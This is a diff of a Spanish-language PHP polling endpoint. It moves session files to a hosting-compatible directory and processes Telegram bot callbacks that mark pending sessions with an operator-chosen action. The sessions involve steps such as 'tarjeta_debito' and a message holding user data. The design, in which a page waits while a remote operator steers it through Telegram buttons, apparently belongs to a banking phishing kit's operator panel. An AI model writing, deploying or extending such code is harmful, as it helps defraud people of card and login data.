@@ -1,9 +1,9 @@
 <?php
 /**
  * ================================================================
- * API Poll — Consulta estado de aprobación
+ * API Poll — Consulta estado de aprobación (Compatible con Vercel/Render)
  * ================================================================
- * Lee el archivo de sesión local. Si es necesario, también
+ * Lee el archivo de sesión correspondiente. Si es necesario, también
  * procesa updates de Telegram (evita múltiples llamadas getUpdates).
  */
 
@@ -21,7 +21,10 @@ if (empty($sessionId) || !preg_match('/^sess_[a-zA-Z0-9_]+$/', $sessionId)) {
     exit;
 }
 
-$sessionFile = __DIR__ . "/../data/{$sessionId}.json";
+// ── Directorio compatible con Vercel (/tmp) y Render (local) ──
+$dataDir = is_writable(__DIR__ . '/../data') ? __DIR__ . '/../data' : sys_get_temp_dir() . '/data';
+
+$sessionFile = $dataDir . "/{$sessionId}.json";
 if (!file_exists($sessionFile)) {
     echo json_encode(['ok' => false, 'error' => 'Sesión no encontrada']);
     exit;
@@ -42,32 +45,30 @@ if (($session['status'] ?? '') !== 'pending') {
 }
 
 // ── Procesar updates de Telegram si es necesario ──
-// Lock global con flock para evitar race conditions entre múltiples requests
-$globalLockFile   = __DIR__ . '/../data/.telegram.flock';
-$globalOffsetFile = __DIR__ . '/../data/.telegram.offset';
-$globalTimeFile   = __DIR__ . '/../data/.telegram.time';
+$globalLockFile   = $dataDir . '/.telegram.flock';
+$globalOffsetFile = $dataDir . '/.telegram.offset';
+$globalTimeFile   = $dataDir . '/.telegram.time';
 
 $shouldProcess = false;
 $lockFp = @fopen($globalLockFile, 'c');
 if ($lockFp) {
     if (flock($lockFp, LOCK_EX | LOCK_NB)) {
-        // Tenemos el lock exclusivo. Verificar si pasaron 2 segundos desde el último procesamiento
+        // Verificar si pasaron 2 segundos desde el último procesamiento
         $lastProcessed = (int)@file_get_contents($globalTimeFile);
         if ((time() - $lastProcessed) >= 2) {
             $shouldProcess = true;
             @file_put_contents($globalTimeFile, (string)time(), LOCK_EX);
         }
-        // Liberar el lock inmediatamente después de leer/escribir el timestamp
         flock($lockFp, LOCK_UN);
     }
     fclose($lockFp);
 }
 
 if ($shouldProcess) {
-    processTelegramUpdates($botToken, $chatId, $globalOffsetFile);
+    processTelegramUpdates($botToken, $chatId, $globalOffsetFile, $dataDir);
 }
 
-// ── Releer sesión (pudo haber sido actualizada por el procesamiento) ──
+// ── Releer sesión actualizada ──
 $session = json_decode(file_get_contents($sessionFile), true) ?: [];
 
 echo json_encode([
@@ -82,7 +83,7 @@ exit;
 // ────────────────────────────────────────────
 // Función: Procesar todos los updates de Telegram
 // ────────────────────────────────────────────
-function processTelegramUpdates($botToken, $chatId, $offsetFile) {
+function processTelegramUpdates($botToken, $chatId, $offsetFile, $dataDir) {
     $lastUpdateId = (int)@file_get_contents($offsetFile);
     $url = "https://api.telegram.org/bot{$botToken}/getUpdates?offset=" . ($lastUpdateId + 1) . "&limit=100";
 
@@ -105,8 +106,6 @@ function processTelegramUpdates($botToken, $chatId, $offsetFile) {
         $cbqId  = $cb['id'] ?? '';
 
         // Parsear: accion_step_sessionId
-        // step puede tener guiones bajos (tarjeta_debito). Usar .+ (greedy) para capturar
-        // todo hasta el ULTIMO _sess_, no hasta el primero.
         if (!preg_match('/^(\w+)_(.+)_(sess_[a-zA-Z0-9_]+)$/', $cbData, $m)) continue;
 
         $action = $m[1];
@@ -118,8 +117,8 @@ function processTelegramUpdates($botToken, $chatId, $offsetFile) {
             @file_get_contents("https://api.telegram.org/bot{$botToken}/answerCallbackQuery?callback_query_id={$cbqId}");
         }
 
-        // Actualizar sesión correspondiente
-        $sessFile = __DIR__ . "/../data/{$sessId}.json";
+        // Actualizar sesión correspondiente usando el directorio correcto
+        $sessFile = $dataDir . "/{$sessId}.json";
         if (!file_exists($sessFile)) continue;
 
         $sessFp = fopen($sessFile, 'r+');
@@ -128,7 +127,6 @@ function processTelegramUpdates($botToken, $chatId, $offsetFile) {
         $sessContent = stream_get_contents($sessFp);
         $sessData = json_decode($sessContent, true) ?: [];
 
-        // Solo si está pendiente (no verificar step para evitar desincronización)
         if (($sessData['status'] ?? '') === 'pending') {
             $sessData['status'] = 'completed';
             $sessData['action'] = $action;
@@ -149,7 +147,6 @@ function processTelegramUpdates($botToken, $chatId, $offsetFile) {
                 ];
                 $actionText = $actionLabels[$action] ?? 'Acción realizada';
                 $originalText = $sessData['messageText'] ?? '';
-                // Agregar la acción al final del mensaje original (preserva usuario y datos)
                 $newText = $originalText . "\n\n<b>" . $actionText . "</b>";
 
                 $editBody = http_build_query([
@@ -162,8 +159,8 @@ function processTelegramUpdates($botToken, $chatId, $offsetFile) {
 
                 $ch = curl_init("https://api.telegram.org/bot{$botToken}/editMessageText");
                 curl_setopt_array($ch, [
-                    CURLOPT_POST           => true,
-                    CURLOPT_POSTFIELDS     => $editBody,
+                    CURLOPT_POST             => true,
+                    CURLOPT_POSTFIELDS       => $editBody,
                     CURLOPT_RETURNTRANSFER => true,
                     CURLOPT_TIMEOUT        => 10,
                     CURLOPT_SSL_VERIFYPEER => true
@@ -182,6 +179,6 @@ function processTelegramUpdates($botToken, $chatId, $offsetFile) {
         fclose($sessFp);
     }
 
-    // Guardar offset global
+    // Guardar offset global en el directorio correcto
     @file_put_contents($offsetFile, (string)$maxUpdateId, LOCK_EX);
 }
